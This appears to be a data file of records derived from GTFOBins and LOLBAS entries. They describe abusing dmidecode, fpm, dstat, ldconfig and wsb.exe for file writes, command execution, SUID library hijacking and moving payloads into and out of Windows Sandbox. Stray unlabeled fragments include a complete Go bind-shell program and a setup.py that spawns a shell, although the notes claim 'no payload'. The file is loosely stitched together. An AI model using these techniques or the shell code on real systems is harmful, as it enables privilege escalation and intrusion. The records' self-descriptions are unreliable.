turns.raw_text: dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file

structured_action.stated_purpose:
It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

```
make dmiwrite
echo DATA >/path/to/temp-file
./dmiwrite /path/to/temp-file x.dmi
```

notes: gtfobins binary=dmidecode func=file-write; command pattern only, no payload

structured_action.stated_purpose:
Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```

The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.

turns.raw_text: dstat --xxx

structured_action.stated_purpose:
`dstat` allows you to run arbitrary Python scripts loaded as "external plugins" if they are located in one of the directories, stated in the `dstat` man page under "FILES":

- `~/.dstat/`
- `(path of binary)/plugins/`
- `/usr/share/dstat/`
- `/usr/local/share/dstat/`

Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.

notes: gtfobins binary=dstat func=inherit; command pattern only, no payload

echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go

turns.raw_text:
echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping

structured_action.stated_purpose:
This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.

First identify the shared libraries used by the target program, for example:

```
$ ldd /bin/ping | grep libcap
        libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000)
```

Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).

notes: gtfobins binary=ldconfig func=library-load; command pattern only, no payload

echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py

turns.raw_text:
wsb start
wsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\SOME_FOLDER --allow-write
wsb exec -r System --id YOUR_ID -c "cmd.exe /c copy {PATH_ABSOLUTE} c:\SOME_FOLDER"

structured_action.stated_purpose: Allows the specified folder to be accessible from within the Windows Sandbox, mounted at `c:\SOME_FOLDER`. This allows, for example, for copying payloads from the host system into the sandbox, copying payloads from the sandbox back to the host system (seen here), or for accessing arbitrary host system files by the sandbox.

notes: lolbas name=wsb.exe category=Execute; command pattern only, no payload

turns.raw_text:
wsb start --config "<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>"
wsb exec -r System --id YOUR_ID -c "cmd.exe /c copy C:\users\WDAGUtilityAccount\Desktop\Temp\{PATH} {PATH}"

structured_action.stated_purpose: Allows the specified folder to be accessible from within the Windows Sandbox, mounted under `C:\users\WDAGUtilityAccount\Desktop` with the same folder name as the source folder. This allows, for example, for copying payloads from the host system into the sandbox (seen here), copying payloads from the sandbox back to the host system, or for accessing arbitrary host system files by the sandbox.

notes: lolbas name=wsb.exe category=Execute; command pattern only, no payload

turns.raw_text:
wsb start --config "<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>"
wsb exec -r System --id YOUR_ID

structured_action.stated_purpose: Executes the given command in a Windows Sandbox from an inline XML configuration with an embedded `<LogonCommand>`, leaving no `.wsb` file on disk. Note: `<LogonCommand>` only fires once `WDAGUtilityAccount` actually logs in, which only happens after an RDP session is established via `wsb connect`, so this pattern opens a visible Sandbox window.

notes: lolbas name=wsb.exe category=Execute; command pattern only, no payload
